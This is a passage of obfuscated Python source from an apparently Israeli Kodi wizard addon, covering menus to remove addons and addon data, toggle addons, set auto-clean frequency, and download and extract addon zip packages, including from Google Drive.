			wiz .log ("Unable to remove %s, Purging DB"%OO0000O0O00OOOOO0 )#line:2982
			wiz .purgeDb (OO0000O0O00OOOOO0 )#line:2983
	else :#line:2984
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:2985
def removeAddonMenu ():#line:2987
	O0OO0000000OO000O =glob .glob (os .path .join (ADDONS ,'*/'))#line:2988
	O00O000OO000OO0OO =[];O0OO0OOOOO0000OO0 =[]#line:2989
	for O0OOO00OO00OOOOOO in sorted (O0OO0000000OO000O ,key =lambda O0OOOOO0O0OO00O00 :O0OOOOO0O0OO00O00 ):#line:2990
		O0OO00OO00OO000OO =os .path .split (O0OOO00OO00OOOOOO [:-1 ])[1 ]#line:2991
		if O0OO00OO00OO000OO in EXCLUDES :continue #line:2992
		elif O0OO00OO00OO000OO in DEFAULTPLUGINS :continue #line:2993
		elif O0OO00OO00OO000OO =='packages':continue #line:2994
		O000OO0OOO00OO00O =os .path .join (O0OOO00OO00OOOOOO ,'addon.xml')#line:2995
		if os .path .exists (O000OO0OOO00OO00O ):#line:2996
			O0O0OOOOOOOO000O0 =open (O000OO0OOO00OO00O )#line:2997
			OOOO00OOOOO0OOO0O =O0O0OOOOOOOO000O0 .read ()#line:2998
			O00O0000OOOO0OOO0 =wiz .parseDOM (OOOO00OOOOO0OOO0O ,'addon',ret ='id')#line:2999
			OOO0O0OOO0OO0OO00 =O0OO00OO00OO000OO if len (O00O0000OOOO0OOO0 )==0 else O00O0000OOOO0OOO0 [0 ]#line:3001
			try :#line:3002
				OOOOO00OOOO00OOOO =xbmcaddon .Addon (id =OOO0O0OOO0OO0OO00 )#line:3003
				O00O000OO000OO0OO .append (OOOOO00OOOO00OOOO .getAddonInfo ('name'))#line:3004
				O0OO0OOOOO0000OO0 .append (OOO0O0OOO0OO0OO00 )#line:3005
			except :#line:3006
				pass #line:3007
	if len (O00O000OO000OO0OO )==0 :#line:3008
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:3009
		return #line:3010
	if KODIV >16 :#line:3011
		OOO0000000OO0O000 =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,O00O000OO000OO0OO )#line:3012
	else :#line:3013
		OOO0000000OO0O000 =[];OO0OOO0OO0OOO000O =0 #line:3014
		OOO0OO0OO0O00OOOO =["-- Click here to Continue --"]+O00O000OO000OO0OO #line:3015
		while not OO0OOO0OO0OOO000O ==-1 :#line:3016
			OO0OOO0OO0OOO000O =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,OOO0OO0OO0O00OOOO )#line:3017
			if OO0OOO0OO0OOO000O ==-1 :break #line:3018
			elif OO0OOO0OO0OOO000O ==0 :break #line:3019
			else :#line:3020
				OOO0OOOOO0O00O0O0 =(OO0OOO0OO0OOO000O -1 )#line:3021
				if OOO0OOOOO0O00O0O0 in OOO0000000OO0O000 :#line:3022
					OOO0000000OO0O000 .remove (OOO0OOOOO0O00O0O0 )#line:3023
					OOO0OO0OO0O00OOOO [OO0OOO0OO0OOO000O ]=O00O000OO000OO0OO [OOO0OOOOO0O00O0O0 ]#line:3024
				else :#line:3025
					OOO0000000OO0O000 .append (OOO0OOOOO0O00O0O0 )#line:3026
					OOO0OO0OO0O00OOOO [OO0OOO0OO0OOO000O ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,O00O000OO000OO0OO [OOO0OOOOO0O00O0O0 ])#line:3027
	if OOO0000000OO0O000 ==None :return #line:3028
	if len (OOO0000000OO0O000 )>0 :#line:3029
		wiz .addonUpdates ('set')#line:3030
		for OOO00OOO0000O0OO0 in OOO0000000OO0O000 :#line:3031
			removeAddon (O0OO0OOOOO0000OO0 [OOO00OOO0000O0OO0 ],O00O000OO000OO0OO [OOO00OOO0000O0OO0 ],True )#line:3032
		xbmc .sleep (1000 )#line:3034
		if INSTALLMETHOD ==1 :OOOO0O000O0O00O0O =1 #line:3036
		elif INSTALLMETHOD ==2 :OOOO0O000O0O00O0O =0 #line:3037
		else :OOOO0O000O0O00O0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:3038
		if OOOO0O000O0O00O0O ==1 :wiz .reloadFix ('remove addon')#line:3039
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:3040
def removeAddonDataMenu ():#line:3042
	if os .path .exists (ADDOND ):#line:3043
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:3044
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:3045
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:3046
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:3047
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3048
		OO0O0O0O0O00OO000 =glob .glob (os .path .join (ADDOND ,'*/'))#line:3049
		for OO0OOOOOOOOO0O000 in sorted (OO0O0O0O0O00OO000 ,key =lambda O0O0OO00000O0O000 :O0O0OO00000O0O000 ):#line:3050
			OOOO0OO00000OOO0O =OO0OOOOOOOOO0O000 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3051
			O0OO0OOO0O0O0O0OO =os .path .join (OO0OOOOOOOOO0O000 .replace (ADDOND ,ADDONS ),'icon.png')#line:3052
			O000OOO0O00000OOO =os .path .join (OO0OOOOOOOOO0O000 .replace (ADDOND ,ADDONS ),'fanart.png')#line:3053
			OO00O00O00O00O00O =OOOO0OO00000OOO0O #line:3054
			O0OO000O0OOOOO000 ={'audio.':'[COLOR orange][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR orange][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR orange][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR orange][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:3055
			for O000O000O00OO0OO0 in O0OO000O0OOOOO000 :#line:3056
				OO00O00O00O00O00O =OO00O00O00O00O00O .replace (O000O000O00OO0OO0 ,O0OO000O0OOOOO000 [O000O000O00OO0OO0 ])#line:3057
			if OOOO0OO00000OOO0O in EXCLUDES :OO00O00O00O00O00O ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%OO00O00O00O00O00O #line:3058
			else :OO00O00O00O00O00O ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%OO00O00O00O00O00O #line:3059
			addFile (' %s'%OO00O00O00O00O00O ,'removedata',OOOO0OO00000OOO0O ,icon =O0OO0OOO0O0O0O0OO ,fanart =O000OOO0O00000OOO ,themeit =THEME2 )#line:3060
	else :#line:3061
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3062
	setView ('files','viewType')#line:3063
def enableAddons ():#line:3065
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3066
	OO00O0000OO0OOOO0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3067
	O0O0O0O00O0OOOO0O =0 #line:3068
	for O0000000OOO0O00O0 in sorted (OO00O0000OO0OOOO0 ,key =lambda OO000O0O0O0OOOOO0 :OO000O0O0O0OOOOO0 ):#line:3069
		O0O0000OOO0OOO00O =os .path .split (O0000000OOO0O00O0 [:-1 ])[1 ]#line:3070
		if O0O0000OOO0OOO00O in EXCLUDES :continue #line:3071
		if O0O0000OOO0OOO00O in DEFAULTPLUGINS :continue #line:3072
		O0OO00O00O0O00O00 =os .path .join (O0000000OOO0O00O0 ,'addon.xml')#line:3073
		if os .path .exists (O0OO00O00O0O00O00 ):#line:3074
			O0O0O0O00O0OOOO0O +=1 #line:3075
			OO00O0000OO0OOOO0 =O0000000OOO0O00O0 .replace (ADDONS ,'')[1 :-1 ]#line:3076
			O0OOOO0O00O0OO00O =open (O0OO00O00O0O00O00 )#line:3077
			O00O00O0OOO0OOO0O =O0OOOO0O00O0OO00O .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3078
			OOOO0OOOO0O0OO000 =wiz .parseDOM (O00O00O0OOO0OOO0O ,'addon',ret ='id')#line:3079
			O00000O0OO0OO0OOO =wiz .parseDOM (O00O00O0OOO0OOO0O ,'addon',ret ='name')#line:3080
			try :#line:3081
				O0OO0O000OO0O000O =OOOO0OOOO0O0OO000 [0 ]#line:3082
				OO000O00O0OOOOO0O =O00000O0OO0OO0OOO [0 ]#line:3083
			except :#line:3084
				continue #line:3085
			try :#line:3086
				O0OOOOO0O0OOOOO00 =xbmcaddon .Addon (id =O0OO0O000OO0O000O )#line:3087
				O00OO00OOO0O0OOOO ="[COLOR green][Enabled][/COLOR]"#line:3088
				OO00O00O0OO0OO0O0 ="false"#line:3089
			except :#line:3090
				O00OO00OOO0O0OOOO ="[COLOR red][Disabled][/COLOR]"#line:3091
				OO00O00O0OO0OO0O0 ="true"#line:3092
				pass #line:3093
			OOO000O0OO0OOO00O =os .path .join (O0000000OOO0O00O0 ,'icon.png')if os .path .exists (os .path .join (O0000000OOO0O00O0 ,'icon.png'))else ICON #line:3094
			O0OO000O00000O00O =os .path .join (O0000000OOO0O00O0 ,'fanart.jpg')if os .path .exists (os .path .join (O0000000OOO0O00O0 ,'fanart.jpg'))else FANART #line:3095
			addFile ("%s %s"%(O00OO00OOO0O0OOOO ,OO000O00O0OOOOO0O ),'toggleaddon',OO00O0000OO0OOOO0 ,OO00O00O0OO0OO0O0 ,icon =OOO000O0OO0OOO00O ,fanart =O0OO000O00000O00O )#line:3096
			O0OOOO0O00O0OO00O .close ()#line:3097
	if O0O0O0O00O0OOOO0O ==0 :#line:3098
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:3099
	setView ('files','viewType')#line:3100
def changeFeq ():#line:3102
	O0O0000OOOO0000O0 =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:3103
	O0O00O00OO0O00O00 =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,O0O0000OOOO0000O0 )#line:3104
	if not O0O00O00OO0O00O00 ==-1 :#line:3105
		wiz .setS ('autocleanfeq',str (O0O00O00OO0O00O00 ))#line:3106
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,O0O0000OOOO0000O0 [O0O00O00OO0O00O00 ]))#line:3107
def developer ():#line:3109
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:3110
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:3111
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:3112
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:3113
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:3114
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:3115
	addFile ('Test APk','testapk',themeit =THEME1 )#line:3116
	setView ('files','viewType')#line:3118
def download (OOOO0OO000OO0OO00 ,OOO000OO00000OOO0 ):#line:3123
  OO00000OOOOO0O00O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:3124
  O0OO000O00OOO0O00 =xbmcgui .DialogProgress ()#line:3125
  O0OO000O00OOO0O00 .create ("XBMC ISRAEL","Downloading "+name ,'','Please Wait')#line:3126
  OO00OOO0OOO0O0O00 =os .path .join (OO00000OOOOO0O00O ,'isr.zip')#line:3127
  OOOOOO0OO0000000O =urllib2 .Request (OOOO0OO000OO0OO00 )#line:3128
  O00OO000O00O000OO =urllib2 .urlopen (OOOOOO0OO0000000O )#line:3129
  OO00000000O0O0000 =xbmcgui .DialogProgress ()#line:3131
  OO00000000O0O0000 .create ("Downloading","Downloading "+name )#line:3132
  OO00000000O0O0000 .update (0 )#line:3133
  OO0OOOO0O0O0OOOOO =OOO000OO00000OOO0 #line:3134
  O0OOO00OOOOOOOOO0 =open (OO00OOO0OOO0O0O00 ,'wb')#line:3135
  try :#line:3137
    O000OOOO0O00O0OO0 =O00OO000O00O000OO .info ().getheader ('Content-Length').strip ()#line:3138
    O00O0OO000O0OO000 =True #line:3139
  except AttributeError :#line:3140
        O00O0OO000O0OO000 =False #line:3141
  if O00O0OO000O0OO000 :#line:3143
        O000OOOO0O00O0OO0 =int (O000OOOO0O00O0OO0 )#line:3144
  O0OOO000O000OOOO0 =0 #line:3146
  OOOO0OOOOO0OO0OOO =time .time ()#line:3147
  while True :#line:3148
        O0000O0O00O0OO00O =O00OO000O00O000OO .read (8192 )#line:3149
        if not O0000O0O00O0OO00O :#line:3150
            sys .stdout .write ('\n')#line:3151
            break #line:3152
        O0OOO000O000OOOO0 +=len (O0000O0O00O0OO00O )#line:3154
        O0OOO00OOOOOOOOO0 .write (O0000O0O00O0OO00O )#line:3155
        if not O00O0OO000O0OO000 :#line:3157
            O000OOOO0O00O0OO0 =O0OOO000O000OOOO0 #line:3158
        if OO00000000O0O0000 .iscanceled ():#line:3159
           OO00000000O0O0000 .close ()#line:3160
           try :#line:3161
            os .remove (OO00OOO0OOO0O0O00 )#line:3162
           except :#line:3163
            pass #line:3164
           break #line:3165
        OOOO0OOOOOOO0O0O0 =float (O0OOO000O000OOOO0 )/O000OOOO0O00O0OO0 #line:3166
        OOOO0OOOOOOO0O0O0 =round (OOOO0OOOOOOO0O0O0 *100 ,2 )#line:3167
        O0O000O00OOOO0O0O =O0OOO000O000OOOO0 /(1024 *1024 )#line:3168
        OO0OO00O0O00000O0 =O000OOOO0O00O0OO0 /(1024 *1024 )#line:3169
        OOOOO0OOO0OO0000O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0O000O00OOOO0O0O ,'teal',OO0OO00O0O00000O0 )#line:3170
        if (time .time ()-OOOO0OOOOO0OO0OOO )>0 :#line:3171
          O00OO0O0O0OO000O0 =O0OOO000O000OOOO0 /(time .time ()-OOOO0OOOOO0OO0OOO )#line:3172
          O00OO0O0O0OO000O0 =O00OO0O0O0OO000O0 /1024 #line:3173
        else :#line:3174
         O00OO0O0O0OO000O0 =0 #line:3175
        O0O000O0000000O0O ='KB'#line:3176
        if O00OO0O0O0OO000O0 >=1024 :#line:3177
           O00OO0O0O0OO000O0 =O00OO0O0O0OO000O0 /1024 #line:3178
           O0O000O0000000O0O ='MB'#line:3179
        if O00OO0O0O0OO000O0 >0 and not OOOO0OOOOOOO0O0O0 ==100 :#line:3180
            O0000OOO0O0OOO00O =(O000OOOO0O00O0OO0 -O0OOO000O000OOOO0 )/O00OO0O0O0OO000O0 #line:3181
        else :#line:3182
            O0000OOO0O0OOO00O =0 #line:3183
        O000OO000OOO000O0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O00OO0O0O0OO000O0 ,O0O000O0000000O0O )#line:3184
        OO00000000O0O0000 .update (int (OOOO0OOOOOOO0O0O0 ),"Downloading "+name ,OOOOO0OOO0OO0000O ,O000OO000OOO000O0 )#line:3186
  O0O0O0O00OO0OO0O0 =xbmc .translatePath (os .path .join ('special://home','addons'))#line:3189
  O0OOO00OOOOOOOOO0 .close ()#line:3191
  extract (OO00OOO0OOO0O0O00 ,O0O0O0O00OO0OO0O0 ,OO00000000O0O0000 )#line:3193
  if os .path .exists (O0O0O0O00OO0OO0O0 +'/scakemyer-script.quasar.burst'):#line:3194
    if os .path .exists (O0O0O0O00OO0OO0O0 +'/script.quasar.burst'):#line:3195
     shutil .rmtree (O0O0O0O00OO0OO0O0 +'/script.quasar.burst',ignore_errors =False )#line:3196
    os .rename (O0O0O0O00OO0OO0O0 +'/scakemyer-script.quasar.burst',O0O0O0O00OO0OO0O0 +'/script.quasar.burst')#line:3197
  if os .path .exists (O0O0O0O00OO0OO0O0 +'/plugin.video.kmediatorrent-master'):#line:3199
    if os .path .exists (O0O0O0O00OO0OO0O0 +'/plugin.video.kmediatorrent'):#line:3200
     shutil .rmtree (O0O0O0O00OO0OO0O0 +'/plugin.video.kmediatorrent',ignore_errors =False )#line:3201
    os .rename (O0O0O0O00OO0OO0O0 +'/plugin.video.kmediatorrent-master',O0O0O0O00OO0OO0O0 +'/plugin.video.kmediatorrent')#line:3202
  xbmc .executebuiltin ('UpdateLocalAddons ')#line:3203
  xbmc .executebuiltin ("UpdateAddonRepos")#line:3204
  try :#line:3205
    os .remove (OO00OOO0OOO0O0O00 )#line:3206
  except :#line:3207
    pass #line:3208
  OO00000000O0O0000 .close ()#line:3209
def dis_or_enable_addon (O00000O0O00OO00OO ,O0O0O0O00O00OO00O ,enable ="true"):#line:3210
    import json #line:3211
    O0O00000O0O0OOO0O ='"%s"'%O00000O0O00OO00OO #line:3212
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%O00000O0O00OO00OO )and enable =="true":#line:3213
        logging .warning ('already Enabled')#line:3214
        return xbmc .log ("### Skipped %s, reason = allready enabled"%O00000O0O00OO00OO )#line:3215
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%O00000O0O00OO00OO )and enable =="false":#line:3216
        return xbmc .log ("### Skipped %s, reason = not installed"%O00000O0O00OO00OO )#line:3217
    else :#line:3218
        OOOO0O0OO00000OOO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O0O00000O0O0OOO0O ,enable )#line:3219
        O00O0OO00O0O0O0OO =xbmc .executeJSONRPC (OOOO0O0OO00000OOO )#line:3220
        OO000OO0O0O0O0000 =json .loads (O00O0OO00O0O0O0OO )#line:3221
        if enable =="true":#line:3222
            xbmc .log ("### Enabled %s, response = %s"%(O00000O0O00OO00OO ,OO000OO0O0O0O0000 ))#line:3223
        else :#line:3224
            xbmc .log ("### Disabled %s, response = %s"%(O00000O0O00OO00OO ,OO000OO0O0O0O0000 ))#line:3225
    if O0O0O0O00O00OO00O =='auto':#line:3226
     return True #line:3227
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:3228
def chunk_report (OOOOOO00OOOOOOO00 ,OOOO00OOOOOO00O00 ,OOOO000000OOO00OO ):#line:3229
   OO0O0OOO000OOO000 =float (OOOOOO00OOOOOOO00 )/OOOO000000OOO00OO #line:3230
   OO0O0OOO000OOO000 =round (OO0O0OOO000OOO000 *100 ,2 )#line:3231
   if OOOOOO00OOOOOOO00 >=OOOO000000OOO00OO :#line:3233
      sys .stdout .write ('\n')#line:3234
def chunk_read (O0OO00O0OO0OO00O0 ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:3236
   import time #line:3237
   OO0OOO0O0OO000OO0 =int (filesize )*1000000 #line:3238
   O00O000OOOO000O0O =0 #line:3240
   OOO0OO00O0OOO00OO =time .time ()#line:3241
   OOO00O0O0000OO0OO =0 #line:3242
   logging .warning ('Downloading')#line:3244
   with open (destination ,"wb")as O00O00OO000OO0000 :#line:3245
    while 1 :#line:3246
      O0O0O0O0000O000OO =time .time ()-OOO0OO00O0OOO00OO #line:3247
      O00000OO0O0OOOOOO =int (OOO00O0O0000OO0OO *chunk_size )#line:3248
      O0O00OOOOOO00OOO0 =O0OO00O0OO0OO00O0 .read (chunk_size )#line:3249
      O00O00OO000OO0000 .write (O0O00OOOOOO00OOO0 )#line:3250
      O00O00OO000OO0000 .flush ()#line:3251
      O00O000OOOO000O0O +=len (O0O00OOOOOO00OOO0 )#line:3252
      O0O0OO0O000000O0O =float (O00O000OOOO000O0O )/OO0OOO0O0OO000OO0 #line:3253
      O0O0OO0O000000O0O =round (O0O0OO0O000000O0O *100 ,2 )#line:3254
      if int (O0O0O0O0000O000OO )>0 :#line:3255
        O0OOOOOOO000OOO00 =int (O00000OO0O0OOOOOO /(1024 *O0O0O0O0000O000OO ))#line:3256
      else :#line:3257
         O0OOOOOOO000OOO00 =0 #line:3258
      if O0OOOOOOO000OOO00 >1024 and not O0O0OO0O000000O0O ==100 :#line:3259
          OO0O00OOO000O0O0O =int (((OO0OOO0O0OO000OO0 -O00000OO0O0OOOOOO )/1024 )/(O0OOOOOOO000OOO00 ))#line:3260
      else :#line:3261
          OO0O00OOO000O0O0O =0 #line:3262
      if OO0O00OOO000O0O0O <0 :#line:3263
        OO0O00OOO000O0O0O =0 #line:3264
      dp .update (int (O0O0OO0O000000O0O ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O0O0OO0O000000O0O ,O00000OO0O0OOOOOO /(1024 *1024 ),OO0OOO0O0OO000OO0 /(1000 *1000 ),O0OOOOOOO000OOO00 ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (OO0O00OOO000O0O0O ,60 ))#line:3265
      if dp .iscanceled ():#line:3266
         dp .close ()#line:3267
         break #line:3268
      if not O0O00OOOOOO00OOO0 :#line:3269
         break #line:3270
      if report_hook :#line:3272
         report_hook (O00O000OOOO000O0O ,chunk_size ,OO0OOO0O0OO000OO0 )#line:3273
      OOO00O0O0000OO0OO +=1 #line:3274
   logging .warning ('END Downloading')#line:3275
   return O00O000OOOO000O0O #line:3276
def googledrive_download (O0000OOO00O0OO000 ,OOO0O0O00000OO0OO ,O00OO000O0O00OO0O ,OO0O0OO0OOOOOOO0O ):#line:3278
    O0OOO0000O000OO00 =[]#line:3282
    O00OO00O0OOOOO0O0 =O0000OOO00O0OO000 .split ('=')#line:3283
    O0000OOO00O0OO000 =O00OO00O0OOOOO0O0 [len (O00OO00O0OOOOO0O0 )-1 ]#line:3284
    def OOOO0O0OO0OO0O0O0 (OOOOOO0OOO000000O ):#line:3286
        for OO00O0O0OO0O0O0OO in OOOOOO0OOO000000O :#line:3288
            logging .warning ('cookie.name')#line:3289
            logging .warning (OO00O0O0OO0O0O0OO .name )#line:3290
            O00O000OO0O0O000O =OO00O0O0OO0O0O0OO .value #line:3291
            if 'download_warning'in OO00O0O0OO0O0O0OO .name :#line:3292
                logging .warning (OO00O0O0OO0O0O0OO .value )#line:3293
                logging .warning ('cookie.value')#line:3294
                return OO00O0O0OO0O0O0OO .value #line:3295
            return O00O000OO0O0O000O #line:3296
        return None #line:3298
    def O00O00OOOOOO0OOOO (OOO000O0OO0OO0O0O ,O0O0OO000O0OO0O00 ):#line:3300
        OOO0OO0O0OOOO00OO =32768 #line:3302
        OOOOOOOO00O0OOO0O =time .time ()#line:3303
        with open (O0O0OO000O0OO0O00 ,"wb")as O0000O0O00O000OO0 :#line:3305
            OOO0OO000000O0O0O =1 #line:3306
            OOO00O0OOO0000OOO =32768 #line:3307
            try :#line:3308
                OO000O0OOO00OO0OO =int (OOO000O0OO0OO0O0O .headers .get ('content-length'))#line:3309
                print ('file total size :',OO000O0OOO00OO0OO )#line:3310
            except TypeError :#line:3311
                print ('using dummy length !!!')#line:3312
                OO000O0OOO00OO0OO =int (OO0O0OO0OOOOOOO0O )*1000000 #line:3313
            for O0OOOO0OO0O00OO00 in OOO000O0OO0OO0O0O .iter_content (OOO0OO0O0OOOO00OO ):#line:3314
                if O0OOOO0OO0O00OO00 :#line:3315
                    O0000O0O00O000OO0 .write (O0OOOO0OO0O00OO00 )#line:3316
                    O0000O0O00O000OO0 .flush ()#line:3317
                    O0000O0O0OO0OOOOO =time .time ()-OOOOOOOO00O0OOO0O #line:3318
                    OOOO0OO0O0OO000O0 =int (OOO0OO000000O0O0O *OOO00O0OOO0000OOO )#line:3319
                    if O0000O0O0OO0OOOOO ==0 :#line:3320
                        O0000O0O0OO0OOOOO =0.1 #line:3321
                    OO00O0O00OOO00000 =int (OOOO0OO0O0OO000O0 /(1024 *O0000O0O0OO0OOOOO ))#line:3322
                    OOO00O0O0OO0OO00O =int (OOO0OO000000O0O0O *OOO00O0OOO0000OOO *100 /OO000O0OOO00OO0OO )#line:3323
                    if OO00O0O00OOO00000 >1024 and not OOO00O0O0OO0OO00O ==100 :#line:3324
                      O000000OO00OOOO00 =int (((OO000O0OOO00OO0OO -OOOO0OO0O0OO000O0 )/1024 )/(OO00O0O00OOO00000 ))#line:3325
                    else :#line:3326
                      O000000OO00OOOO00 =0 #line:3327
                    O00OO000O0O00OO0O .update (int (OOO00O0O0OO0OO00O ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(OOO00O0O0OO0OO00O ,OOOO0OO0O0OO000O0 /(1024 *1024 ),OO000O0OOO00OO0OO /(1000 *1000 ),OO00O0O00OOO00000 ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (O000000OO00OOOO00 ,60 ))#line:3329
                    OOO0OO000000O0O0O +=1 #line:3330
                    if O00OO000O0O00OO0O .iscanceled ():#line:3331
                     O00OO000O0O00OO0O .close ()#line:3332
                     break #line:3333
    OO0OO00O0O0OOO0O0 ="https://docs.google.com/uc?export=download"#line:3334
    import urllib2 #line:3339
    import cookielib #line:3340
    from cookielib import CookieJar #line:3342
    O000000OOO00O000O =CookieJar ()#line:3344
    O0OO00O0OO00O00O0 =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (O000000OOO00O000O ))#line:3345
    O00O0OOO0OO0OO000 ={'id':O0000OOO00O0OO000 }#line:3347
    O0OOOOO00O0OOO00O =urllib .urlencode (O00O0OOO0OO0OO000 )#line:3348
    logging .warning (OO0OO00O0O0OOO0O0 +'&'+O0OOOOO00O0OOO00O )#line:3349
    OOO00OO0OO0OO0OOO =O0OO00O0OO00O00O0 .open (OO0OO00O0O0OOO0O0 +'&'+O0OOOOO00O0OOO00O )#line:3350
    OO00000OOO00O0O00 =OOO00OO0OO0OO0OOO .read ()#line:3351
    for O0O00OOOOO00O0000 in O000000OOO00O000O :#line:3353
         logging .warning (O0O00OOOOO00O0000 )#line:3354
    O00OO0O00OO00OO0O =OOOO0O0OO0OO0O0O0 (O000000OOO00O000O )#line:3355
    logging .warning (O00OO0O00OO00OO0O )#line:3356
    if O00OO0O00OO00OO0O :#line:3357
        O000OOO0000OOOO00 ={'id':O0000OOO00O0OO000 ,'confirm':O00OO0O00OO00OO0O }#line:3358
        OOO000O000OOOOO00 ={'Access-Control-Allow-Headers':'Content-Length'}#line:3359
        O0OOOOO00O0OOO00O =urllib .urlencode (O000OOO0000OOOO00 )#line:3360
        OOO00OO0OO0OO0OOO =O0OO00O0OO00O00O0 .open (OO0OO00O0O0OOO0O0 +'&'+O0OOOOO00O0OOO00O )#line:3361
        chunk_read (OOO00OO0OO0OO0OOO ,report_hook =chunk_report ,dp =O00OO000O0O00OO0O ,destination =OOO0O0O00000OO0OO ,filesize =OO0O0OO0OOOOOOO0O )#line:3362
    return (O0OOO0000O000OO00 )#line:3366
def kodi17Fix ():#line:3367
	OO00O000OOO00OO0O =glob .glob (os .path .join (ADDONS ,'*/'))#line:3368
	OOOOOO00O0OO00OOO =[]#line:3369
	for OO0OOO00000OO0O00 in sorted (OO00O000OOO00OO0O ,key =lambda OOO00O0OOOO0OO000 :OOO00O0OOOO0OO000 ):#line:3370
		OOOO0OO0OO0O0O0OO =os .path .join (OO0OOO00000OO0O00 ,'addon.xml')#line:3371
		if os .path .exists (OOOO0OO0OO0O0O0OO ):#line:3372
			O0OO0OOOO0OO0O0O0 =OO0OOO00000OO0O00 .replace (ADDONS ,'')[1 :-1 ]#line:3373
			OOOOOO0O0000OOO00 =open (OOOO0OO0OO0O0O0OO )#line:3374
			O00OOO0O000O0000O =OOOOOO0O0000OOO00 .read ()#line:3375
			OOOO0O00OOO000OOO =parseDOM (O00OOO0O000O0000O ,'addon',ret ='id')#line:3376
			OOOOOO0O0000OOO00 .close ()#line:3377
			try :#line:3378
				O0O0O0OOO00O00O0O =xbmcaddon .Addon (id =OOOO0O00OOO000OOO [0 ])#line:3379
			except :#line:3380
				try :#line:3381
					log ("%s was disabled"%OOOO0O00OOO000OOO [0 ],xbmc .LOGDEBUG )#line:3382
					OOOOOO00O0OO00OOO .append (OOOO0O00OOO000OOO [0 ])#line:3383
				except :#line:3384
					try :#line:3385
						log ("%s was disabled"%O0OO0OOOO0OO0O0O0 ,xbmc .LOGDEBUG )#line:3386
						OOOOOO00O0OO00OOO .append (O0OO0OOOO0OO0O0O0 )#line:3387
					except :#line:3388
						if len (OOOO0O00OOO000OOO )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%O0OO0OOOO0OO0O0O0 ,xbmc .LOGERROR )#line:3389
						else :log ("Unabled to enable: %s"%OO0OOO00000OO0O00 ,xbmc .LOGERROR )#line:3390
	if len (OOOOOO00O0OO00OOO )>0 :#line:3391
		OOOO000OO0O0O0O0O =0 #line:3392
		DP .create (ADDONTITLE ,'[COLOR %s]Enabling disabled Addons'%COLOR2 ,'','Please Wait[/COLOR]')#line:3393
		for OO00OO000O00000OO in OOOOOO00O0OO00OOO :#line:3394
			OOOO000OO0O0O0O0O +=1 #line:3395
